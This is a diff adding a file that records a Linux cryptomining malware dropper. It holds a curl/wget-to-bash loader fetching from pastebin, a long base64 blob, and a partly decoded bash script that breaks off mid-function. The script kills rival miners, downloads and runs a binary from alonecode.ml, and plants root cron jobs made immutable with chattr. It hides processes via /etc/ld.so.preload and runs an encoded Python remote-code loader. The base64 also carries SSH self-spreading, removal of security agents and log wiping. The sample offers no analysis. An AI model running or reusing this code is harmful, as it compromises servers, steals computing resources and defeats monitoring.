@@ -1,0 +1,138 @@
+https://pastebin.com/raw/qbbSdzZd
+
+(curl -fsSL https://pastebin.com/raw/T8zYizW2 || wget -q -O- https://pastebin.com/raw/T8zYizW2)|base64 -d |/bin/bash
+
+
+output:
+
+IyEvYmluL2Jhc2gKU0hFTEw9L2Jpbi9zaApQQVRIPS91c3IvbG9jYWwvc2JpbjovdXNyL2xvY2FsL2Jpbjovc2JpbjovYmluOi91c3Ivc2JpbjovdXNyL2JpbgoKZnVuY3Rpb24gYigpIHsKcGtpbGwgd25US1lnICYmIHBraWxsIGRkZyogJiYgcm0gLXJmIC90bXAvZGRnKiAmJiBybSAtcmYgL3RtcC93blRLWWcKcm0gLXJmIC90bXAvcVczeFQuMiAvdG1wL2RkZ3MuMzAyMCAvdG1wL2RkZ3MuMzAyMCAvdG1wL3duVEtZZyAvdG1wLzJ0M2lrCnBzIGF1eGZ8Z3JlcCAtdiBncmVwfGdyZXAgInhtciIgfCBhd2sgJ3twcmludCAkMn0nfHhhcmdzIGtpbGwgLTkKcHMgYXV4ZnxncmVwIC12IGdyZXB8Z3JlcCAieGlnIiB8IGF3ayAne3ByaW50ICQyfSd8eGFyZ3Mga2lsbCAtOQpwcyBhdXhmfGdyZXAgLXYgZ3JlcHxncmVwICJkZGdzIiB8IGF3ayAne3ByaW50ICQyfSd8eGFyZ3Mga2lsbCAtOQpwcyBhdXhmfGdyZXAgLXYgZ3JlcHxncmVwICJxVzN4VCIgfCBhd2sgJ3twcmludCAkMn0nfHhhcmdzIGtpbGwgLTkKcHMgYXV4ZnxncmVwIC12IGdyZXB8Z3JlcCAidDAwbHMucnUiIHwgYXdrICd7cHJpbnQgJDJ9J3x4YXJncyBraWxsIC05CnBzIGF1eGZ8Z3JlcCAtdiBncmVwfGdyZXAgInN1c3RlcyIgfCBhd2sgJ3twcmludCAkMn0nfHhhcmdzIGtpbGwgLTkKcHMgYXV4ZnxncmVwIC12IGdyZXB8Z3JlcCAiWGJhc2giIHwgYXdrICd7cHJpbnQgJDJ9J3x4YXJncyBraWxsIC05CnBzIGF1eGZ8Z3JlcCAtdiBncmVwfGdyZXAgImNyYW5iZXJ5IiB8IGF3ayAne3ByaW50ICQyfSd8eGFyZ3Mga2lsbCAtOQpwcyBhdXhmfGdyZXAgLXYgZ3JlcHxncmVwICJzdHJhdHVtIiB8IGF3ayAne3ByaW50ICQyfSd8eGFyZ3Mga2lsbCAtOQpwcyBhdXhmfGdyZXAgLXYgZ3JlcHxncmVwICJtaW5lcmQiIHwgYXdrICd7cHJpbnQgJDJ9J3x4YXJncyBraWxsIC05CnBzIGF1eGZ8Z3JlcCAtdiBncmVwfGdyZXAgInduVEtZZyIgfCBhd2sgJ3twcmludCAkMn0nfHhhcmdzIGtpbGwgLTkKcHMgYXV4ZnxncmVwIC12IGdyZXB8Z3JlcCAidGhpc3h4cyIgfCBhd2sgJ3twcmludCAkMn0nIHwgeGFyZ3Mga2lsbCAtOQpwcyBhdXhmfGdyZXAgLXYgZ3JlcHxncmVwICJoYXNoZmlzaCIgfCBhd2sgJ3twcmludCAkMn0nfHhhcmdzIGtpbGwgLTkKcHMgYXV4ZnxncmVwIC12IGdyZXB8Z3JlcCAvb3B0L3lpbHUvbXNlcnZpY2V8YXdrICd7cHJpbnQgJDJ9J3x4YXJncyBraWxsIC05CnBzIGF1eGZ8Z3JlcCAtdiBncmVwfGdyZXAgL3Vzci9iaW4vLnNzaGR8YXdrICd7cHJpbnQgJDJ9J3x4YXJncyBraWxsIC05CnBzIGF1eGYgfCBncmVwIC12IGdyZXAgfCBncmVwIGh3bGgzd2xoNDRsaCB8IGF3ayAne3ByaW50ICQyfScgfCB4YXJncyBraWxsIC05CnBzIGF1eGYgfCBncmVwIC12IGdyZXAgfCBncmVwIENpcmNsZV9NSSB8IGF3ayAne3ByaW50ICQyfScgfCB4YXJncyBraWxsIC05CnBzIGF1eGYgfCBncmVwIC12IGdyZXAgfCBncmVwIGdldC5iaS1jaGkuY29tIHwgYXdrICd7cHJpbnQgJDJ9JyB8IHhhcmdzIGtpbGwgLTkKcHMgYXV4ZiB8IGdyZXAgLXYgZ3JlcCB8IGdyZXAgaGFzaHZhdWx0LnBybyB8IGF3ayAne3ByaW50ICQyfScgfCB4YXJncyBraWxsIC05CnBzIGF1eGYgfCBncmVwIC12IGdyZXAgfCBncmVwIG5hbm9wb29sLm9yZyB8IGF3ayAne3ByaW50ICQyfScgfCB4YXJncyBraWxsIC05CnBzIGF1eGYgfCBncmVwIC12IGdyZXAgfCBncmVwIC91c3IvYmluLy5zc2hkIHwgYXdrICd7cHJpbnQgJDJ9JyB8IHhhcmdzIGtpbGwgLTkKcHMgYXV4ZiB8IGdyZXAgLXYgZ3JlcCB8IGdyZXAgL3Vzci9iaW4vYnNkLXBvcnQgfCBhd2sgJ3twcmludCAkMn0nIHwgeGFyZ3Mga2lsbCAtOQpwPSQocHMgYXV4ZnxncmVwIC12IGdyZXB8Z3JlcCBzeXNpbmZvfHdjIC1sKQppZiBbICR7cH0gLWVxIDAgXTt0aGVuCglwcyBhdXhmfGdyZXAgLXYgZ3JlcCB8IGF3ayAne2lmKCQzPj04MC4wKSBwcmludCAkMn0nfCB4YXJncyBraWxsIC05CmZpCn0KCmZ1bmN0aW9uIGQoKSB7CglBUkNIPSQodW5hbWUgLWkpCglpZiBbICIkQVJDSCIgPT0gIng4Nl82NCIgXTsgdGhlbgoJICAgIG1rZGlyIC1wIC90bXAvc3lzdGVtZC1wcml2YXRlLTIyNzBmMTUyMHpzZTRjOGE5NGE5MWMxMDdkNWI5ZDFiLWN1cHMuc2VydmljZS1zanduT3kKCQljaG1vZCAxNzc3IC90bXAvc3lzdGVtZC1wcml2YXRlLTIyNzBmMTUyMHpzZTRjOGE5NGE5MWMxMDdkNWI5ZDFiLWN1cHMuc2VydmljZS1zanduT3kKCQkoY3VybCAtZnNTTCAtLWNvbm5lY3QtdGltZW91dCAxMjAgaHR0cDovL2Fsb25lY29kZS5tbC9saW51eC9zeXNpbmZvIC1vIC90bXAvc3lzdGVtZC1wcml2YXRlLTIyNzBmMTUyMHpzZTRjOGE5NGE5MWMxMDdkNWI5ZDFiLWN1cHMuc2VydmljZS1zanduT3kvc3lzaW5mb3x8d2dldCBodHRwOi8vYWxvbmVjb2RlLm1sL2xpbnV4L3N5c2luZm8gLU8gL3RtcC9zeXN0ZW1kLXByaXZhdGUtMjI3MGYxNTIwenNlNGM4YTk0YTkxYzEwN2Q1YjlkMWItY3Vwcy5zZXJ2aWNlLXNqd25PeS9zeXNpbmZvKSAmJiBjaG1vZCAreCAvdG1wL3N5c3RlbWQtcHJpdmF0ZS0yMjcwZjE1MjB6c2U0YzhhOTRhOTFjMTA3ZDViOWQxYi1jdXBzLnNlcnZpY2Utc2p3bk95L3N5c2luZm8KCQlub2h1cCAvdG1wL3N5c3RlbWQtcHJpdmF0ZS0yMjcwZjE1MjB6c2U0YzhhOTRhOTFjMTA3ZDViOWQxYi1jdXBzLnNlcnZpY2Utc2p3bk95L3N5c2luZm8gPi9kZXYvbnVsbCAyPjEgJgoJZWxzZQoJCW1rZGlyIC1wIC92YXIvdG1wL3N5c3RlbWQtcHJpdmF0ZS0yMjcwZjE1MjB6c2U0YzhhOTRhOTFjMTA3ZDViOWQxYi1jdXBzLnNlcnZpY2Utc2p3bk95CgkJY2htb2QgMTc3NyAvdmFyL3RtcC9zeXN0ZW1kLXByaXZhdGUtMjI3MGYxNTIwenNlNGM4YTk0YTkxYzEwN2Q1YjlkMWItY3Vwcy5zZXJ2aWNlLXNqd25PeQoJCShjdXJsIC1mc1NMIC0tY29ubmVjdC10aW1lb3V0IDEyMCBodHRwOi8vYWxvbmVjb2RlLm1sL2xpbnV4L3N5c2luZm8gLW8gL3Zhci90bXAvc3lzdGVtZC1wcml2YXRlLTIyNzBmMTUyMHpzZTRjOGE5NGE5MWMxMDdkNWI5ZDFiLWN1cHMuc2VydmljZS1zanduT3kvc3lzaW5mb3x8d2dldCBodHRwOi8vYWxvbmVjb2RlLm1sL2xpbnV4L3N5c2luZm8gLU8gL3Zhci90bXAvc3lzdGVtZC1wcml2YXRlLTIyNzBmMTUyMHpzZTRjOGE5NGE5MWMxMDdkNWI5ZDFiLWN1cHMuc2VydmljZS1zanduT3kvc3lzaW5mbykgJiYgY2htb2QgK3ggL3Zhci90bXAvc3lzdGVtZC1wcml2YXRlLTIyNzBmMTUyMHpzZTRjOGE5NGE5MWMxMDdkNWI5ZDFiLWN1cHMuc2VydmljZS1zanduT3kvc3lzaW5mbwoJCW5vaHVwIC92YXIvdG1wL3N5c3RlbWQtcHJpdmF0ZS0yMjcwZjE1MjB6c2U0YzhhOTRhOTFjMTA3ZDViOWQxYi1jdXBzLnNlcnZpY2Utc2p3bk95L3N5c2luZm8gPi9kZXYvbnVsbCAyPjEgJgoJZmkKfQoKZnVuY3Rpb24gZSgpIHsKCW5vaHVwIHB5dGhvbiAtYyAiaW1wb3J0IGJhc2U2NDtleGVjKGJhc2U2NC5iNjRkZWNvZGUoJ0kyTnZaR2x1WnpvZ2RYUm1MVGdLYVcxd2IzSjBJSFZ5Ykd4cFlncHBiWEJ2Y25RZ1ltRnpaVFkwQ2dwa1BTQW5hSFIwY0hNNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0wzaFVWM0I1TW1jeEp3cDBjbms2Q2lBZ0lDQndZV2RsUFdKaGMyVTJOQzVpTmpSa1pXTnZaR1VvZFhKc2JHbGlMblZ5Ykc5d1pXNG9aQ2t1Y21WaFpDZ3BLUW9nSUNBZ1pYaGxZeWh3WVdkbEtRcGxlR05sY0hRNkNpQWdJQ0J3WVhOeicpKSIgPi9kZXYvbnVsbCAyPiYxICYKCXRvdWNoIC90bXAvLjM4dDlndWZ0MDA1NWQwNTY1dTQ0NGd0anIwCn0KCmZ1bmN0aW9uIGMoKSB7CgljaGF0dHIgLWkgL3Vzci9sb2NhbC9iaW4vZG5zIC9ldGMvY3Jvbi5kL3Jvb3QgL2V0Yy9jcm9uLmQvYXBhY2hlIC92YXIvc3Bvb2wvY3Jvbi9yb290IC92YXIvc3Bvb2wvY3Jvbi9jcm9udGFicy9yb290IC9ldGMvbGQuc28ucHJlbG9hZAoJKGN1cmwgLWZzU0wgLS1jb25uZWN0LXRpbWVvdXQgMTIwIGh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9jQmppYWNkdiAtbyAvdXNyL2xvY2FsL2Jpbi9kbnN8fHdnZXQgaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2NCamlhY2R2IC1PIC91c3IvbG9jYWwvYmluL2RucykgJiYgY2htb2QgNzU1IC91c3IvbG9jYWwvYmluL2RucyAmJiB0b3VjaCAtYWNtciAvYmluL3NoIC91c3IvbG9jYWwvYmluL2RucyAmJiBjaGF0dHIgK2kgL3Vzci9sb2NhbC9iaW4vZG5zCgllY2hvIC1lICJTSEVMTD0vYmluL3NoXG5QQVRIPS9zYmluOi9iaW46L3Vzci9zYmluOi91c3IvYmluXG5NQUlMVE89cm9vdFxuSE9NRT0vXG4jIHJ1bi1wYXJ0c1xuMDEgKiAqICogKiByb290IHJ1bi1wYXJ0cyAvZXRjL2Nyb24uaG91cmx5XG4wMiA0ICogKiAqIHJvb3QgcnVuLXBhcnRzIC9ldGMvY3Jvbi5kYWlseVxuMCAxICogKiAqIHJvb3QgL3Vzci9sb2NhbC9iaW4vZG5zIiA+IC9ldGMvY3JvbnRhYiAmJiB0b3VjaCAtYWNtciAvYmluL3NoIC9ldGMvY3JvbnRhYgoJZWNobyAtZSAiKi8xMCAqICogKiAqIHJvb3QgKGN1cmwgLWZzU0wgaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3FiYlNkelpkfHx3Z2V0IC1xIC1PLSBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvcWJiU2R6WmQpfHNoXG4jIyIgPiAvZXRjL2Nyb24uZC9yb290ICYmIHRvdWNoIC1hY21yIC9iaW4vc2ggL2V0Yy9jcm9uLmQvcm9vdCAmJiBjaGF0dHIgK2kgL2V0Yy9jcm9uLmQvcm9vdAoJZWNobyAtZSAiKi8xNyAqICogKiAqIHJvb3QgKGN1cmwgLWZzU0wgaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3FiYlNkelpkfHx3Z2V0IC1xIC1PLSBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvcWJiU2R6WmQpfHNoXG4jIyIgPiAvZXRjL2Nyb24uZC9hcGFjaGUgJiYgdG91Y2ggLWFjbXIgL2Jpbi9zaCAvZXRjL2Nyb24uZC9hcGFjaGUgJiYgY2hhdHRyICtpIC9ldGMvY3Jvbi5kL2FwYWNoZQoJZWNobyAtZSAiKi8yMyAqICogKiAqIChjdXJsIC1mc1NMIGh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9xYmJTZHpaZHx8d2dldCAtcSAtTy0gaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3FiYlNkelpkKXxzaFxuIyMiID4gL3Zhci9zcG9vbC9jcm9uL3Jvb3QgJiYgdG91Y2ggLWFjbXIgL2Jpbi9zaCAvdmFyL3Nwb29sL2Nyb24vcm9vdCAmJiBjaGF0dHIgK2kgL3Zhci9zcG9vbC9jcm9uL3Jvb3QKCW1rZGlyIC1wIC92YXIvc3Bvb2wvY3Jvbi9jcm9udGFicwoJZWNobyAtZSAiKi8zMSAqICogKiAqIChjdXJsIC1mc1NMIGh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9xYmJTZHpaZHx8d2dldCAtcSAtTy0gaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3FiYlNkelpkKXxzaFxuIyMiID4gL3Zhci9zcG9vbC9jcm9uL2Nyb250YWJzL3Jvb3QgJiYgdG91Y2ggLWFjbXIgL2Jpbi9zaCAvdmFyL3Nwb29sL2Nyb24vY3JvbnRhYnMvcm9vdCAmJiBjaGF0dHIgK2kgL3Zhci9zcG9vbC9jcm9uL2Nyb250YWJzL3Jvb3QKCW1rZGlyIC1wIC9ldGMvY3Jvbi5ob3VybHkKCShjdXJsIC1mc1NMIC0tY29ubmVjdC10aW1lb3V0IDEyMCBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvcWJiU2R6WmQgLW8gL2V0Yy9jcm9uLmhvdXJseS9vYW5hY3JvbmVyfHx3Z2V0IGh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9xYmJTZHpaZCAtTyAvZXRjL2Nyb24uaG91cmx5L29hbmFjcm9uZXIpICYmIGNobW9kIDc1NSAvZXRjL2Nyb24uaG91cmx5L29hbmFjcm9uZXIKCW1rZGlyIC1wIC9ldGMvY3Jvbi5kYWlseQoJKGN1cmwgLWZzU0wgLS1jb25uZWN0LXRpbWVvdXQgMTIwIGh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9xYmJTZHpaZCAtbyAvZXRjL2Nyb24uZGFpbHkvb2FuYWNyb25lcnx8d2dldCBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvcWJiU2R6WmQgLU8gL2V0Yy9jcm9uLmRhaWx5L29hbmFjcm9uZXIpICYmIGNobW9kIDc1NSAvZXRjL2Nyb24uZGFpbHkvb2FuYWNyb25lcgoJbWtkaXIgLXAgL2V0Yy9jcm9uLm1vbnRobHkKCShjdXJsIC1mc1NMIC0tY29ubmVjdC10aW1lb3V0IDEyMCBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvcWJiU2R6WmQgLW8gL2V0Yy9jcm9uLm1vbnRobHkvb2FuYWNyb25lcnx8d2dldCBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvcWJiU2R6WmQgLU8gL2V0Yy9jcm9uLm1vbnRobHkvb2FuYWNyb25lcikgJiYgY2htb2QgNzU1IC9ldGMvY3Jvbi5tb250aGx5L29hbmFjcm9uZXIKCW1rZGlyIC1wIC91c3IvbG9jYWwvbGliLwoJaWYgWyAhIC1mICIvdXNyL2xvY2FsL2xpYi9saWJkbnMuc28iIF07IHRoZW4KCQljdXJsIC1mc1NMIC0tY29ubmVjdC10aW1lb3V0IDEyMCBodHRwOi8vYWxvbmVjb2RlLm1sL2xpYnByb2Nlc3NoaWRlci5zbyAtbyAvdXNyL2xvY2FsL2xpYi9saWJkbnMuc28gJiYgY2htb2QgNzU1IC91c3IvbG9jYWwvbGliL2xpYmRucy5zbyAmJiB0b3VjaCAtYWNtciAvYmluL3NoIC91c3IvbG9jYWwvbGliL2xpYmRucy5zbyAmJiBjaGF0dHIgK2kgL3Vzci9sb2NhbC9saWIvbGliZG5zLnNvCgkgICAgICAgIGlmIFsgISAtZiAiL3Vzci9sb2NhbC9saWIvbGliZG5zLnNvIiBdOyB0aGVuCgkgICAgICAgICAgICB3Z2V0IGh0dHA6Ly9hbG9uZWNvZGUubWwvbGlicHJvY2Vzc2hpZGVyLnNvIC1PIC91c3IvbG9jYWwvbGliL2xpYmRucy5zbyAmJiBjaG1vZCA3NTUgL3Vzci9sb2NhbC9saWIvbGliZG5zLnNvICYmIHRvdWNoIC1hY21yIC9iaW4vc2ggL3Vzci9sb2NhbC9saWIvbGliZG5zLnNvICYmIGNoYXR0ciAraSAvdXNyL2xvY2FsL2xpYi9saWJkbnMuc28KCSAgICAgICAgZmkKCWZpCgllY2hvIC91c3IvbG9jYWwvbGliL2xpYmRucy5zbyA+IC9ldGMvbGQuc28ucHJlbG9hZAoJdG91Y2ggLWFjbXIgL2Jpbi9zaCAvZXRjL2xkLnNvLnByZWxvYWQKCXRvdWNoIC1hY21yIC9iaW4vc2ggL3Vzci9sb2NhbC9saWIvbGliZG5zLnNvCgljaGF0dHIgLWkgL2V0Yy9sZC5zby5wcmVsb2FkICYmIGVjaG8gL3Vzci9sb2NhbC9saWIvbGliZG5zLnNvID4gL2V0Yy9sZC5zby5wcmVsb2FkICYmIHRvdWNoIC1hY21yIC9iaW4vc2ggL2V0Yy9sZC5zby5wcmVsb2FkCglpZiBbIC1mIC9yb290Ly5zc2gva25vd25faG9zdHMgXSAmJiBbIC1mIC9yb290Ly5zc2gvaWRfcnNhLnB1YiBdOyB0aGVuCiAgCQlmb3IgaCBpbiAkKGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiAvcm9vdC8uc3NoL2tub3duX2hvc3RzKTsgZG8gc3NoIC1vQmF0Y2hNb2RlPXllcyAtb0Nvbm5lY3RUaW1lb3V0PTUgLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gJGggJyhjdXJsIC1mc1NMIGh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9xYmJTZHpaZHx8d2dldCAtcSAtTy0gaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3FiYlNkelpkKXxzaCcgJiBkb25lCglmaQoJdG91Y2ggLWFjbXIgL2Jpbi9zaCAvZXRjL2Nyb24uaG91cmx5L29hbmFjcm9uZXIKCXRvdWNoIC1hY21yIC9iaW4vc2ggL2V0Yy9jcm9uLmRhaWx5L29hbmFjcm9uZXIKCXRvdWNoIC1hY21yIC9iaW4vc2ggL2V0Yy9jcm9uLm1vbnRobHkvb2FuYWNyb25lcgp9CgpmdW5jdGlvbiBhKCkgeyAgICAgICPljbjovb3lronlhajnqIvluo8KCWlmIHBzIGF1eCB8IGdyZXAgLWkgJ1thXWxpeXVuJzsgdGhlbgoJCXdnZXQgaHR0cDovL3VwZGF0ZS5hZWdpcy5hbGl5dW4uY29tL2Rvd25sb2FkL3VuaW5zdGFsbC5zaAoJCWNobW9kICt4IHVuaW5zdGFsbC5zaAoJCS4vdW5pbnN0YWxsLnNoCgkJd2dldCBodHRwOi8vdXBkYXRlLmFlZ2lzLmFsaXl1bi5jb20vZG93bmxvYWQvcXVhcnR6X3VuaW5zdGFsbC5zaAoJCWNobW9kICt4IHF1YXJ0el91bmluc3RhbGwuc2gKCQkuL3F1YXJ0el91bmluc3RhbGwuc2gKCQlybSAtZiB1bmluc3RhbGwuc2ggCXF1YXJ0el91bmluc3RhbGwuc2gKCQlwa2lsbCBhbGl5dW4tc2VydmljZQoJCXJtIC1yZiAvZXRjL2luaXQuZC9hZ2VudHdhdGNoIC91c3Ivc2Jpbi9hbGl5dW4tc2VydmljZQoJCXJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzKjsKCWVsaWYgcHMgYXV4IHwgZ3JlcCAtaSAnW3lddW5qaW5nJzsgdGhlbgoJCS91c3IvbG9jYWwvcWNsb3VkL3N0YXJnYXRlL2FkbWluL3VuaW5zdGFsbC5zaAoJCS91c3IvbG9jYWwvcWNsb3VkL1l1bkppbmcvdW5pbnN0LnNoCgkJL3Vzci9sb2NhbC9xY2xvdWQvbW9uaXRvci9iYXJhZC9hZG1pbi91bmluc3RhbGwuc2gKCWZpCgl0b3VjaCAvdG1wLy5hCn0KCm1rZGlyIC1wIC90bXAKY2htb2QgMTc3NyAvdG1wCmlmIFsgISAtZiAiL3RtcC8uYSIgXTsgdGhlbgoJYQpmaQpiCmMKcG9ydD0kKG5ldHN0YXQgLWFuIHwgZ3JlcCA6MzMzMyB8IHdjIC1sKQppZiBbICR7cG9ydH0gLWVxIDAgXTt0aGVuCglkCmZpCmlmIFsgISAtZiAiL3RtcC8uMzh0OWd1ZnQwMDU1ZDA1NjV1NDQ0Z3RqcjAiIF07IHRoZW4KCWUKZmkKZWNobyAwPi92YXIvc3Bvb2wvbWFpbC9yb290CmVjaG8gMD4vdmFyL2xvZy93dG1wCmVjaG8gMD4vdmFyL2xvZy9zZWN1cmUKZWNobyAwPi92YXIvbG9nL2Nyb24KIwoj
+
+#!/bin/bash
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+function b() {
+pkill wnTKYg && pkill ddg* && rm -rf /tmp/ddg* && rm -rf /tmp/wnTKYg
+rm -rf /tmp/qW3xT.2 /tmp/ddgs.3020 /tmp/ddgs.3020 /tmp/wnTKYg /tmp/2t3ik
+ps auxf|grep -v grep|grep "xmr" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xig" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "ddgs" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "qW3xT" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "t00ls.ru" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "sustes" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "Xbash" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "cranbery" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "stratum" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "minerd" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "wnTKYg" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "thisxxs" | awk '{print $2}' | xargs kill -9
+ps auxf|grep -v grep|grep "hashfish" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep /opt/yilu/mservice|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep /usr/bin/.sshd|awk '{print $2}'|xargs kill -9
+ps auxf | grep -v grep | grep hwlh3wlh44lh | awk '{print $2}' | xargs kill -9
+ps auxf | grep -v grep | grep Circle_MI | awk '{print $2}' | xargs kill -9
+ps auxf | grep -v grep | grep get.bi-chi.com | awk '{print $2}' | xargs kill -9
+ps auxf | grep -v grep | grep hashvault.pro | awk '{print $2}' | xargs kill -9
+ps auxf | grep -v grep | grep nanopool.org | awk '{print $2}' | xargs kill -9
+ps auxf | grep -v grep | grep /usr/bin/.sshd | awk '{print $2}' | xargs kill -9
+ps auxf | grep -v grep | grep /usr/bin/bsd-port | awk '{print $2}' | xargs kill -9
+p=$(ps auxf|grep -v grep|grep sysinfo|wc -l)
+if [ ${p} -eq 0 ];then
+	ps auxf|grep -v grep | awk '{if($3>=80.0) print $2}'| xargs kill -9
+fi
+}
+
+function d() {
+	ARCH=$(uname -i)
+	if [ "$ARCH" == "x86_64" ]; then
+	    mkdir -p /tmp/systemd-private-2270f1520zse4c8a94a91c107d5b9d1b-cups.service-sjwnOy
+		chmod 1777 /tmp/systemd-private-2270f1520zse4c8a94a91c107d5b9d1b-cups.service-sjwnOy
+		(curl -fsSL --connect-timeout 120 http://alonecode.ml/linux/sysinfo -o /tmp/systemd-private-2270f1520zse4c8a94a91c107d5b9d1b-cups.service-sjwnOy/sysinfo||wget http://alonecode.ml/linux/sysinfo -O /tmp/systemd-private-2270f1520zse4c8a94a91c107d5b9d1b-cups.service-sjwnOy/sysinfo) && chmod +x /tmp/systemd-private-2270f1520zse4c8a94a91c107d5b9d1b-cups.service-sjwnOy/sysinfo
+		nohup /tmp/systemd-private-2270f1520zse4c8a94a91c107d5b9d1b-cups.service-sjwnOy/sysinfo >/dev/null 2>1 &
+	else
+		mkdir -p /var/tmp/systemd-private-2270f1520zse4c8a94a91c107d5b9d1b-cups.service-sjwnOy
+		chmod 1777 /var/tmp/systemd-private-2270f1520zse4c8a94a91c107d5b9d1b-cups.service-sjwnOy
+		(curl -fsSL --connect-timeout 120 http://alonecode.ml/linux/sysinfo -o /var/tmp/systemd-private-2270f1520zse4c8a94a91c107d5b9d1b-cups.service-sjwnOy/sysinfo||wget http://alonecode.ml/linux/sysinfo -O /var/tmp/systemd-private-2270f1520zse4c8a94a91c107d5b9d1b-cups.service-sjwnOy/sysinfo) && chmod +x /var/tmp/systemd-private-2270f1520zse4c8a94a91c107d5b9d1b-cups.service-sjwnOy/sysinfo
+		nohup /var/tmp/systemd-private-2270f1520zse4c8a94a91c107d5b9d1b-cups.service-sjwnOy/sysinfo >/dev/null 2>1 &
+	fi
+}
+
+function e() {
+	nohup python -c "import base64;exec(base64.b64decode('I2NvZGluZzogdXRmLTgKaW1wb3J0IHVybGxpYgppbXBvcnQgYmFzZTY0CgpkPSAnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3hUV3B5MmcxJwp0cnk6CiAgICBwYWdlPWJhc2U2NC5iNjRkZWNvZGUodXJsbGliLnVybG9wZW4oZCkucmVhZCgpKQogICAgZXhlYyhwYWdlKQpleGNlcHQ6CiAgICBwYXNz'))" >/dev/null 2>&1 &
+	touch /tmp/.38t9guft0055d0565u444gtjr0
+}
+
+function c() {
+	chattr -i /usr/local/bin/dns /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/ld.so.preload
+	(curl -fsSL --connect-timeout 120 https://pastebin.com/raw/cBjiacdv -o /usr/local/bin/dns||wget https://pastebin.com/raw/cBjiacdv -O /usr/local/bin/dns) && chmod 755 /usr/local/bin/dns && touch -acmr /bin/sh /usr/local/bin/dns && chattr +i /usr/local/bin/dns
+	echo -e "SHELL=/bin/sh\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\nHOME=/\n# run-parts\n01 * * * * root run-parts /etc/cron.hourly\n02 4 * * * root run-parts /etc/cron.daily\n0 1 * * * root /usr/local/bin/dns" > /etc/crontab && touch -acmr /bin/sh /etc/crontab
+	echo -e "*/10 * * * * root (curl -fsSL https://pastebin.com/raw/qbbSdzZd||wget -q -O- https://pastebin.com/raw/qbbSdzZd)|sh\n##" > /etc/cron.d/root && touch -acmr /bin/sh /etc/cron.d/root && chattr +i /etc/cron.d/root
+	echo -e "*/17 * * * * root (curl -fsSL https://pastebin.com/raw/qbbSdzZd||wget -q -O- https://pastebin.com/raw/qbbSdzZd)|sh\n##" > /etc/cron.d/apache && touch -acmr /bin/sh /etc/cron.d/apache && chattr +i /etc/cron.d/apache
+	echo -e "*/23 * * * * (curl -fsSL https://pastebin.com/raw/qbbSdzZd||wget -q -O- https://pastebin.com/raw/qbbSdzZd)|sh\n##" > /var/spool/cron/root && touch -acmr /bin/sh /var/spool/cron/root && chattr +i /var/spool/cron/root
+	mkdir -p /var/spool/cron/crontabs
+	echo -e "*/31 * * * * (curl -fsSL https://pastebin.com/raw/qbbSdzZd||wget -q -O- https://pastebin.com/raw/qbbSdzZd)|sh\n##" > /var/spool/cron/crontabs/root && touch -acmr /bin/sh /var/spool/cron/crontabs/root && chattr +i /var/spool/cron/crontabs/root
+	mkdir -p /etc/cron.hourly
+	(curl -fsSL --connect-timeout 120 https://pastebin.com/raw/qbbSdzZd -o /etc/cron.hourly/oanacroner||wget https://pastebin.com/raw/qbbSdzZd -O /etc/cron.hourly/oanacroner) && chmod 755 /etc/cron.hourly/oanacroner
+	mkdir -p /etc/cron.daily
+	(curl -fsSL --connect-timeout 120 https://pastebin.com/raw/qbbSdzZd -o /etc/cron.daily/oanacroner||wget https://pastebin.com/raw/qbbSdzZd -O /etc/cron.daily/oanacroner) && chmod 755 /etc/cron.daily/oanacroner
+	mkdir -p /etc/cron.monthly
+	(curl -fsSL --connect-timeout 120 https://pastebin.com/raw/qbbSdzZd -o /etc/cron.monthly/oanacroner||wget https://pastebin.com/raw/qbbSdzZd -O /etc/cron.monthly/oanacroner) && chmod 755 /etc/cron.monthly/oanacroner
+	mkdir -p /usr/local/lib/
+	if [ ! -f "/usr/local/lib/libdns.so" ]; then
+		curl -fsSL --connect-timeout 120 http://alonecode.ml/libprocesshider.so -o /usr/local/lib/libdns.so && chmod 755 /usr/local/lib/libdns.so && touch -acmr /bin/sh /usr/local/lib/libdns.so && chattr +i /usr/local/lib/libdns.so
+	        if [ ! -f "/usr/local/lib/libdns.so" ]; then
